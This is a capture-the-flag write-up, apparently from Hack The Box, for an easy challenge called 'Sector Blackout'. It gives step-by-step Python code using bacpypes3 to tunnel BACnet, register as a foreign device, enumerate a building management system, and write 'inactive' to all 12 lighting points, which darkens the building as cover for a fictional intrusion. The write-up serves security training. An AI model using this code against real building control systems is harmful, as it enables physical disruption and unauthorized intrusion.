![img](../../assets/banner.png)

<img src='../../assets/htb.png' style='zoom: 80%;' align=left /><font size='10'>Sector Blackout</font>

8<sup>th</sup> Feb 2026

Prepared By: `0xSn4k3000`

Challenge Author(s): `0xSn4k3000`

Difficulty: <font color='green'>easy</font>

<br><br>

# Synopsis (!)

- Tunnel BACnet traffic over TCP using a provided proxy
- Register as a BACnet Foreign Device to interface with a remote router
- Perform internal network and device discovery via `Who-Is` broadcasts
- Enumerate BMS device objects and identify specific targets
- Manipulate `binary-value` properties to initiate a global blackout

## Description (!)

- A winter storm is stressing the grid. One guard, one patrol route. Tunnel into the BACnet router and kill all 12 lighting sectors — it'll log as a weather fault. He'll head to the breaker room. That's Nightfall's window.

## Skills Required (!)

- Basic knowledge of the BACnet/IP Protocol and network topology
- Understanding of Foreign Device Registration mechanisms
- Scripting BACnet operations using the `bacpypes3` Python library

# Solution (!)

## Step 1: Initial Analysis

The challenge provides two files: `note.md` and `udp2tcp.py`. We begin by examining the provided note to understand the challenge architecture.

```text
┌──────────────────────────────────────────────────────────────────────┐ 
│                           Architecture                               │
│                                                                      │
│   ┌──────────────┐        ┌──────────────┐        ┌──────────────┐   │
│   │  TCP Proxy   │◄──────►│  Network 1001│◄──────►│  Network 2001│   │
│   │  (47808/tcp) │        │  ( BACnet    |        |              |   |
|   |                       |    Router )  │        │  (Internal)  │   │
│   │              │        │              │        │  • 12 Lights │   │
│   │  tcp2udp.py  │        │              │        │              │   |
│   └──────────────┘        └──────────────┘        └──────────────┘   │
│          ▲                                                           |
│          │ TCP 47808 (Length-prefixed)                               │
│   ┌──────┴──────┐                                                    │
│   │   Player    │                                                    │
│   └─────────────┘                                                    │
└──────────────────────────────────────────────────────────────────────┘ 

Use `udp2tcp.py` to convert your local udp traffic to the tcp port.
```

From this architecture diagram, we can deduce a few key points:
- The challenge revolves around the **BACnet protocol**, which typically relies on UDP.
- Our traffic must be tunneled via TCP using the provided `udp2tcp.py` script to reach the remote TCP Proxy.
- We have access to a BACnet Router (Network 1001).
- Our ultimate goal is to access the internal network (Network 2001) to interact with and turn off the 12 lights in the building.

## Step 2: Reconnaissance & CCTV Dashboard

Upon scanning the provided target, we will find two exposed ports:
1. **The TCP Proxy**: The proxy detailed in the architecture note, which we will use to tunnel our outgoing BACnet traffic.
2. **CCTV Dashboard**: A web interface monitoring 12 different locations within the building. Opening this port in a browser displays a live view for each area.

## Step 3: Routing and Foreign Device Registration

Now that we understand the architecture, we can start writing some Python scripts to interact with the router. We will use the `bacpypes3` library for this.

Before we do anything, we must first start the `udp2tcp.py` proxy to establish our connection to the router:

```bash
$ ./udp2tcp.py <local_udp_port> <remote_tcp_host> <remote_tcp_port>
```

Next, we need to connect to the BACnet router and search for internal networks. To ensure our traffic flows smoothly through the tunnel and is correctly handled by the target router, we must register as a **Foreign Application** (Foreign Device).

### What is a Foreign Application?
In BACnet/IP, broadcasts are typically limited to the local subnet. A Foreign Device (or Foreign Application) is a BACnet node located on a different subnet that registers with a BACnet Broadcast Management Device (BBMD) — in this case, the remote BACnet router. This registration allows our remote script to send and receive broadcast messages across the network boundary, effectively making our local script act as if it were directly connected to the internal BACnet network. 

Here is the initial script to register as a Foreign Application and prepare for discovery:

```python
#!/usr/bin/env python3
import asyncio
from bacpypes3.pdu import IPv4Address, Address
from bacpypes3.ipv4.app import ForeignApplication
from bacpypes3.local.device import DeviceObject as LocalDeviceObject

async def main():
    client_device = LocalDeviceObject(
        objectName="DiscoveryClient", 
        objectIdentifier=("device", 9999)
    )

    # Discover devices
    source_addr = IPv4Address("0.0.0.0:47809")
    app = ForeignApplication(client_device, source_addr)
    
    router_address = IPv4Address("127.0.0.1:47808")

    print(f"\n[*] Connecting to {router_address}...")
    # Register as a Foreign Device to ensure traffic flows smoothly
    app.foreign.register(router_address, 3600)
    await asyncio.sleep(1)

if __name__ == "__main__":
    asyncio.run(main())
```

With registration complete, we can send a `Who-Is` broadcast to discover BACnet devices. Add the following to the script:

```python
    print("[*] Sending standard Who-Is to discover the device...")
    await app.who_is(address=router_address)
    await asyncio.sleep(1)

    devices = list(app.device_info_cache.instance_cache.keys())
    print(devices)
```

Running this script yields:

```bash
[*] Connecting to 127.0.0.1...
[*] Sending standard Who-Is to discover the device...
[1001]
```

This output successfully confirms that we have discovered device `1001`, which is our BACnet Router.

Next, we can query the router to find out what internal networks it has access to by utilizing the `Who-Is-Router-To-Network` service. Add the following to our script:

```python
    # Discover networks
    await app.nse.who_is_router_to_network(destination=router_address)
    await asyncio.sleep(1)
    
    # Inspect the client's internal routing cache to see what the router replied with
    known_networks = []
    for (snet, address), dnets in app.nsap.router_info_cache.router_dnets.items():
        known_networks.extend(dnets)

    print(f"Known Networks: {known_networks}")
```

Running this script will output:

```bash
[*] Connecting to 127.0.0.1...
[*] Sending standard Who-Is to discover the device...
[2001]
```

This confirms the existence of Network `2001`, which matches the internal network from our architecture note, where the 12 target lights are located.

Now that we are aware of the internal network (`2001`), we can query it directly to discover the specific devices residing there. We can update our script to loop through our `known_networks` and send a directed `Who-Is` broadcast to each:

```python
    # Discover devices in the network
    for network in known_networks:
        remote_broadcast = Address(f"{network}:*")
        await app.who_is(address=remote_broadcast)
        await asyncio.sleep(1)

        devices = []
        for device_id, device_info in app.device_info_cache.instance_cache.items():
            devices.append(device_id)

        print(f"[+] Discovered devices: {devices}")
    
    # we can print their addresses to see which one is on network 2001
    print("\n[+] Device details:")
    for device_id, device_info in app.device_info_cache.instance_cache.items():
        print(f"    -> Device ID: {device_id} @ Address: {device_info.device_address}")
```

Executing this portion of the script reveals the devices on the internal network:

```bash
[+] Discovered devices: [1001, 2001]

[+] Device details:
    -> Device ID: 1001 @ Address: 127.0.0.1
    -> Device ID: 2001 @ Address: 2001:2
```

We can quickly identify device `2001` residing at the network address `2001:2`. This must be the controller responsible for the lights in the building, making it our primary target.

## Step 4: Enumerating Device Objects

Now that we know the target device address (`2001:2`) and its ID (`device:2001`), we can examine all the BACnet objects connected to this controller. We start by requesting the device's `object-list` property:

```python
    # Discover objects in the device
    target_address = Address("2001:2")
    target_device_id = "device:2001"

    try:
        object_list = await app.read_property(target_address, target_device_id, "object-list")
    except Exception as e:
        print(f"[-] Error reading object-list: {e}")
        app.close()
        return
```

Next, we iterate through the retrieved object list and attempt to read their properties to understand what each object controls:

```python
    for obj_id in object_list:
        obj_type, obj_inst = obj_id
        print(f"\n    [+] Object: {obj_type}:{obj_inst}")
        
        # Read some interesting properties
        properties = ["object-name", "description", "present-value", "units", "state-text"]
        for prop in properties:
            try:
                # Catching BaseException to ensure we skip on any errors including BACnet errors
                value = await app.read_property(target_address, obj_id, prop)
                if value is not None and type(value).__name__ != 'ErrorRejectAbortNack':
                    print(f"        -> {prop}: {value}")
            except BaseException:
                pass
```

Running this enumeration script gives us a detailed map of the controller's endpoints:

```bash
[+] Found 14 objects in device:

    [+] Object: device:2001
        -> object-name: Building-BMS
        -> description: Building Management System — 12 Locations

    [+] Object: binary-value:1
        -> object-name: Lobby-Main-Lights
        -> description: Light control for Lobby-Main
        -> present-value: active

    [+] Object: binary-value:2
        -> object-name: Lobby-Side-Lights
        -> description: Light control for Lobby-Side
        -> present-value: active

    [+] Object: binary-value:3
        -> object-name: Hallway-North-Lights
        -> description: Light control for Hallway-North
        -> present-value: active

    [+] Object: binary-value:4
        -> object-name: Hallway-South-Lights
        -> description: Light control for Hallway-South
        -> present-value: active

    [+] Object: binary-value:5
        -> object-name: Office-2F-A-Lights
        -> description: Light control for Office-2F-A
        -> present-value: active

    [+] Object: binary-value:6
        -> object-name: Office-2F-B-Lights
        -> description: Light control for Office-2F-B
        -> present-value: active

    [+] Object: binary-value:7
        -> object-name: ServerRoom-A-Lights
        -> description: Light control for ServerRoom-A
        -> present-value: active

    [+] Object: binary-value:8
        -> object-name: ServerRoom-B-Lights
        -> description: Light control for ServerRoom-B
        -> present-value: active

    [+] Object: binary-value:9
        -> object-name: Stairwell-East-Lights
        -> description: Light control for Stairwell-East
        -> present-value: active

    [+] Object: binary-value:10
        -> object-name: Stairwell-West-Lights
        -> description: Light control for Stairwell-West
        -> present-value: active

    [+] Object: binary-value:11
        -> object-name: Parking-Lights
        -> description: Light control for Parking
        -> present-value: active

    [+] Object: binary-value:12
        -> object-name: MainDoor-Lights
        -> description: Light control for MainDoor
        -> present-value: active

    [+] Object: analog-value:1
        -> object-name: SecurityStatus
        -> description: All lights operational
        -> present-value: 0.0
```

Now that we have successfully identified our true targets—the 12 `binary-value` objects representing each light location—our final goal is to interact with them and flip their states to `inactive`.

## Step 5: Modifying Target Properties

We can achieve our objective by looping through the 12 `binary-value` elements and instructing the controller to set their `present-value` to `inactive`. 

> **Why `inactive` instead of `0`?**
> In the BACnet protocol, `BinaryValueObject` states use standard enumerations rather than raw integers. According to the BACnet specification, binary states are represented as `"active"` (ON) and `"inactive"` (OFF). The `bacpypes3` Python library strictly adheres to this standard. Attempting to write a `0` would likely result in an encoding error or be ignored by the controller. We must send the exact enumeration string `"inactive"` to properly trigger the state change.

Adding the following loop to our overarching script will get the job done:

```python
    NUM_LOCATIONS = 12
    bms_addr = Address("2001:2")

    print("[*] Initiating light shutdown sequence...")
    for loc in range(1, NUM_LOCATIONS + 1):
        try:
            await app.write_property(
                bms_addr, f"binaryValue,{loc}", "presentValue", "inactive"
            )
            print(f"    [+] Location {loc}: LIGHTS OFF")
        except Exception as e:
            print(f"    [-] Location {loc}: FAILED — {e}")
        await asyncio.sleep(0.5)
```

Running this final phase of the script will sequentially disable the lights across the building:

```bash
[*] Initiating light shutdown sequence...
    [+] Location 1: LIGHTS OFF
    [+] Location 2: LIGHTS OFF
...
    [+] Location 12: LIGHTS OFF
```

With the sequence completed, you can check the CCTV Dashboard to verify that the entire building is now dark. The challenge is completed, and we retrieve the final flag.
